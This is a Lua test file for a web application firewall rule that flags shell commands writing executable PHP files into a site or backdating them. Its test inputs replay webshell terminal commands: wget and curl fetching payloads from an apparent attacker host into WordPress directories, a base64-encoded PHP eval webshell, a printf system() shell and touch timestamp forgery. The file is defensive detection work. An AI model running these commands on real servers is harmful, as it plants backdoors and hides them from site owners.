-- Tests for rule 331 (rule_shell_write_exec, WAF_RCE, logonly): a shell
-- command in the args or body that writes an executable file into the site,
-- or backdates one.
--
-- The positives are the commands the tophair.gr webshell terminal ran
-- (2026-10-08, /?dark&term=1; the files they left are in the quarantine:
-- colors.php fetched from kaye1337.pages.dev, upgrade.php, a wp-config copy,
-- g.php backdated to 2025-07-10) in every encoding a form can send. Rules
-- 310-317 read the query string only, so none of them matched in a POST
-- body. The negatives are prose, markup and commands that write no
-- executable file.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")
local det = require("cfm_waf_detectors")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

local function ue(s) return (s:gsub("[^%w%-%._~]", function(c) return string.format("%%%02X", c:byte()) end)) end

-- o: { method, uri, args, body, ct }
local function req(o)
  return { uri = o.uri or "/", args = o.args or "", method = o.method or "POST",
           raw_uri = (o.uri or "/") .. ((o.args and o.args ~= "") and ("?" .. o.args) or ""),
           host = "www.tophair.gr", ip = "187.15.100.4",
           headers = { host = "www.tophair.gr", ["content-type"] = o.ct or "application/x-www-form-urlencoded",
                       ["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/141.0" },
           body = o.body or "", cookie = "" }
end
-- The terminal's form post: cmd=<command>, form-encoded ('+' for spaces).
local function term(cmd)
  return req({ args = "dark&path=%2Fhome%2Ftophairg%2Fpublic_html&term=1",
               body = "cmd=" .. ue(cmd):gsub("%%20", "+") })
end

local function fires(c, label, want)
  local hit, reason, _, action, _, rid = waf.check(c)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  check(reason == want, label .. " — reason=" .. want .. " (got " .. tostring(reason) .. ")")
  check(rid == 331, label .. " — rule 331 (got " .. tostring(rid) .. ")")
  check(action == "logonly", label .. " — logonly (got " .. tostring(action) .. ")")
end
local function clean(c, label)
  local hit, reason = waf.check(c)
  check(hit ~= true, label .. " — must NOT fire (got " .. tostring(reason) .. ")")
end

local FETCH, REDIR, TOUCH = "WAF_RCE:SHELL_FETCH_TO_EXEC", "WAF_RCE:SHELL_REDIRECT_TO_EXEC", "WAF_RCE:SHELL_TOUCH_BACKDATE"

check(waf.get_config().rule_shell_write_exec == "logonly", "331 ships logonly")
set_only({ rule_shell_write_exec = "logonly" })

-- ── The tophair terminal, as it posted ──────────────────────────────────────
fires(term("wget -q https://kaye1337.pages.dev/stfu/m.jpg -O wp-admin/css/colors/midnight/colors.php"),
      "wget -O into wp-admin (colors.php)", FETCH)
fires(term("curl -s -o wp-includes/class-wp-loader.php https://kaye1337.pages.dev/stfu/m.jpg"),
      "curl -o into wp-includes", FETCH)
fires(term("echo PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOyA/Pg== | base64 -d > wp-content/upgrade/upgrade.php"),
      "echo | base64 -d > upgrade.php", REDIR)
fires(term("touch -d '2025-07-10 20:39' g.php"), "touch -d backdating g.php", TOUCH)

-- ── Every shape of the same commands ────────────────────────────────────────
fires(term("wget -qO wp-content/mu-plugins/x.php http://203.0.113.5/x.txt"), "wget -qO (flag cluster)", FETCH)
fires(term("curl -sSLo /home/u/public_html/a.phtml https://x.example/p"), "curl -sSLo .phtml", FETCH)
fires(term("curl -O https://x.example/tools/shell.php"), "curl -O of a .php URL", FETCH)
fires(term("wget --output-document=index.php https://x.example/i"), "wget --output-document=", FETCH)
fires(term("curl --output .htaccess https://x.example/h"), "curl --output .htaccess", FETCH)
fires(term("wget https://x.example/u -O .user.ini"), "wget -O .user.ini", FETCH)
fires(term('cd /home/u/public_html; wget -O "wp-admin/terms.php" https://x.example/t'), "after cd …; quoted output", FETCH)
fires(term("id && curl -o x.php5 https://x.example/a"), "after &&, .php5", FETCH)
fires(term("x=$(curl -o y.phar https://x.example/a)"), "inside $( )", FETCH)
fires(term("cat /tmp/.config >> wp-load.inc"), "cat >> .inc", REDIR)
fires(term("printf '<?php system($_GET[c]);' > s.php"), "printf > s.php", REDIR)
fires(term("curl -s https://x.example/p >wp-admin/includes/class-wp-internal-module.php"), "curl > (no space)", REDIR)
fires(term("xxd -r -p h.txt > a.php7"), "xxd -r > .php7", REDIR)
fires(term("touch -t 202507102039 wp-config.php"), "touch -t", TOUCH)
fires(term("touch -r wp-load.php g.php"), "touch -r (copy another file's time)", TOUCH)
fires(term("touch --date='last year' g.php"), "touch --date", TOUCH)
fires(req({ args = "c=" .. ue("wget -O x.php https://x.example/a") }), "in the query string", FETCH)
fires(req({ ct = "application/json", body = '{"cmd":"wget -O x.php https://x.example/a"}' }), "JSON body", FETCH)
fires(req({ ct = "multipart/form-data; boundary=b", body = '--b\r\nContent-Disposition: form-data; name="c"\r\n\r\nwget -O x.php https://x.example/a\r\n--b--\r\n' }),
      "multipart field", FETCH)
fires(req({ body = "a=1&cmd=" .. ue("WGET -O X.PHP https://x.example/a") }), "upper case (the surface is lowercased)", FETCH)
fires(req({ body = "c=" .. ue("ls\nwget -O x.php https://x.example/a") }), "after a newline", FETCH)
fires(req({ ct = "application/json", body = '{"cmd" : "curl -o x.php https://x.example/a"}' }), "JSON value with blanks around ':'", FETCH)
fires(term("python3 -c 'print(1)' > x.php"), "python3 > x.php", REDIR)
-- JSON values ending in the file name (the closing quote is not a shell
-- quote), arrays, escapes; command prefixes, absolute paths, sh -c; tee.
fires(req({ ct = "application/json", body = '{"cmd":"echo x > a.php"}' }), "JSON value ending in the name", REDIR)
fires(req({ ct = "application/json", body = '{"cmd":"wget https://x/a -o a.php","z":"1"}' }), "JSON, a key after it", FETCH)
fires(req({ ct = "application/json", body = '{"c":["wget -o a.php https://x/a"]}' }), "JSON array value", FETCH)
fires(req({ ct = "application/json", body = '{"c":"printf \\"<?php\\" > wp-admin\\/x.php"}' }), "JSON with \\\" and \\/ escapes", REDIR)
fires(term("sudo wget -O x.php https://x.example/a"), "sudo prefix", FETCH)
fires(term("nohup curl -o x.php https://x.example/a"), "nohup prefix", FETCH)
fires(term("/usr/bin/wget -O x.php https://x.example/a"), "absolute path to the verb", FETCH)
fires(term("sh -c 'echo x > a.php'"), "sh -c '…'", REDIR)
fires(term("bash -c \"curl -o a.php https://x.example/a\""), "bash -c \"…\"", FETCH)
fires(term("echo PD9w | base64 -d | tee wp-content/x.php"), "| tee x.php", REDIR)
fires(term("cat s | tee -a .htaccess"), "| tee -a .htaccess", REDIR)
fires(term("wget -O a.php74 https://x.example/a"), "a MultiPHP handler name (.php74)", FETCH)
fires(term("echo x > a.phtm"), ".phtm", REDIR)
-- Second review: assignments, redirect spellings, JSON escapes, long bodies.
fires(term("env a=1 wget -O x.php https://x/a"), "env a=1 prefix", FETCH)
fires(term("cd /tmp; home=/tmp wget -O x.php https://x/a"), "HOME=/tmp prefix after ;", FETCH)
fires(term("echo PD9w | base64 -d >| x.php"), ">| clobber", REDIR)
fires(term("curl https://x/a &> x.php"), "&> redirect", REDIR)
fires(term("curl https://x/a 2>&1 >> x.php"), "2>&1 then >>", REDIR)
fires(req({ ct = "application/json", body = '{"cmd":"cd /tmp\\nwget -O x.php https://x/a"}' }), "after a JSON \\n", FETCH)
fires(req({ ct = "application/json", body = '{"cmd":"ls;\\twget -O x.php https://x/a"}' }), "after a JSON \\t", FETCH)
fires(term("echo '<?php " .. string.rep("$a=1;", 90) .. " ?>' > x.php"), "echo of a 450-byte payload", REDIR)
fires(term("touch -d 2020-01-01 g.php") , "touch first, then decoys (below)", TOUCH)
fires(req({ body = "c=" .. ue("touch -d 2020-01-01 g.php") .. "&d=" .. ue(string.rep("wget -q https://example.com/" .. string.rep("a", 40) .. ".html; ", 330)) }),
      "a real touch before 16 KB of wget decoys", TOUCH)
-- Third review: a second command in one JSON value / sh -c, a JSON value's
-- closing quote after ;, a JSON \t before touch's option, wget cron lines.
fires(req({ ct = "application/json", body = '{"cmd":"wget -q -o - http://a/cron; wget http://x/m.jpg -o x.php"}' }),
      "a second wget in one JSON value", FETCH)
fires(term("sh -c 'wget -q -o- http://a; wget http://x/m.jpg -o x.php'"), "a second wget in one sh -c", FETCH)
fires(req({ ct = "application/json", body = '{"cmd":"cd /tmp; wget http://x/m.jpg -o x.php","t":"1"}' }), "JSON, after ;, a key after it", FETCH)
fires(req({ ct = "application/json", body = '{"cmd":"cd /tmp\\nwget http://x/m.jpg -o x.php","t":"1"}' }), "JSON, after \\n, a key after it", FETCH)
fires(req({ ct = "application/json", body = '{"cmd":"cd /x; echo pd9 | base64 -d > up.php","x":1}' }), "JSON redirect, a key after it", REDIR)
fires(req({ ct = "application/json", body = '{"cmd":"printf \\"a;b\\" > x.php"}' }), "JSON \\\"…\\\" holding a ;", REDIR)
fires(req({ ct = "application/json", body = '{"cmd":"touch\\t-d\\t2025 g.php"}' }), "touch with JSON \\t", TOUCH)
fires(term(string.rep("wget a;", 40) .. "wget http://x/m.jpg -o x.php"), "a real wget after 40 decoy wgets", FETCH)
fires(req({ body = "c=" .. ue(string.rep("cat a > b.txt; ", 200) .. "wget -O x.php https://x.example/a") }),
      "a real command after 200 decoy commands (inside the parse budget)", FETCH)

-- ── Not a write of an executable file ───────────────────────────────────────
clean(term("ls -la /home/tophairg/public_html"), "ls")
clean(term("cat wp-config.php"), "cat with no redirect")
clean(term("cp wp-config.php wp-admin/wp-config.php"), "cp (left out: no fetch, no redirect)")
clean(term("wget -O backup.zip https://x.example/b.zip"), "wget -O of a zip")
clean(term("curl -o page.html https://x.example/p.php"), "curl -o .html (the URL's .php is not the output)")
fires(term("wget https://kaye1337.pages.dev/stfu/shell.php"), "wget with no -O saves under the URL's name", FETCH)
clean(term("wget https://x.example/archive.zip"), "wget of a zip under its own name")
clean(term("wget --spider https://x.example/install.php"), "wget --spider writes nothing")
clean(term("wget -O /dev/null https://x.example/wp-cron.php"), "wget -O /dev/null of a .php URL")
clean(term("echo hello > /dev/null"), "echo to /dev/null")
clean(term("touch newfile.php"), "touch with no backdating flag")
clean(req({ body = "comment=" .. ue("Run the installer: open install.php in your browser > then click Next") }), "prose with > and .php")
clean(req({ body = "comment=" .. ue("I used curl and wget yesterday, the output was fine.php or so") }), "prose naming the tools")
clean(req({ body = "content=" .. ue('<p>Download <a href="/files/setup.php">setup.php</a></p>') }), "HTML link to a .php")
clean(req({ body = "content=" .. ue("<span>Price > 5</span><b>cat</b> index.php") }), "markup: > and a verb word, no command")
clean(req({ body = "product=" .. ue("Touch screen -d model 2025") }), "touch with an operand before any option (touch screen -d)")
clean(req({ body = "note=" .. ue("touchscreen -d") }), "touchscreen is another word")
clean(req({ body = "q=" .. ue("echo dot speaker > alexa") }), "redirect to a non-executable name")
clean(req({ body = "content=" .. ue('<p class="cat">a > b</p> <a href="/x.php">x</a>') }), "a quote after = is markup (class=\"cat\"), not a command")
clean(req({ body = "c=" .. ue("pythonic > x.php") }), "pythonic is not python")
clean(term("wget -q -O - https://example.com/wp-cron.php?doing_wp_cron >/dev/null 2>&1"), "the WordPress cron line (-O - is stdout)")
clean(term("curl -s -o - https://example.com/cron.php"), "curl -o - (stdout)")
clean(req({ body = "note=" .. ue("usage: echo foo > bar.php") }), "a bare ':' in prose is not a command position")
clean(req({ body = "q=" .. ue("see (cat > x.php)") }), "a bare '(' is not $(")
clean(term("touch -- -d"), "touch -- -d creates a file named -d")
clean(req({ body = "c=" .. ue("I tried to wget -O x.php it") }), "a non-prefix word before the verb")
clean(req({ ct = "application/json", body = '{"title":"cat","t":"a > b.php"}' }), "a JSON value ending at its quote reads no further")
clean(req({ body = "c=" .. ue("echo x > a.phps") }), ".phps is source, not executable")
clean(req({ body = "comment=" .. ue("please echo foo > bar.php") }), "a form field's first word is not an env assignment")
clean(term("echo x | tee a.php.txt"), "tee to a .txt")
clean(req({ body = "q=" .. ue("tee shirt order.php") }), "tee with no pipe before it")
clean(req({ body = "tee=" .. ue("wp-admin/x.php") }), "a field named tee")
clean(term("wget -q https://x.gr/wp-cron.php?doing_wp_cron >/dev/null 2>&1"), "wget cron line with a query (saved as wp-cron.php?doing_wp_cron)")
clean(term("wget -q --delete-after https://x.gr/wp-cron.php"), "wget --delete-after cron line")
clean(term("wget https://shop.php"), "a host-only URL saves index.html")
clean(req({ body = "content=" .. ue(string.rep('<p class="cat">Price > 5 <a href="/x.php">echo</a> touch</p>\n', 300)) }),
      "19 KB of markup naming every verb")

check(det.detect_shell_write_exec(nil) == nil, "nil")
check(det.detect_shell_write_exec("") == nil, "empty")

set_only({ rule_shell_write_exec = "disabled" })
clean(term("wget -O x.php https://x.example/a"), "331 disabled")

if fails > 0 then
  io.stderr:write(("cfm_waf shell write-exec tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf shell command writing an executable file (rule 331)")
